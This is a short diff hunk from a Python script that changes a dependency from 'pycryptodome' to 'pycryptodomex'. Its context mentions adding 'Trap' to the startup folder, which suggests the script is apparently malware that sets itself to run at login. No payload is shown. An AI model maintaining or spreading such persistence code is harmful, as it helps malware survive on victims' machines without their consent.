@@ -36,7 +36,7 @@ else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+    ["Crypto.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
 for module in requirements:
     try: 
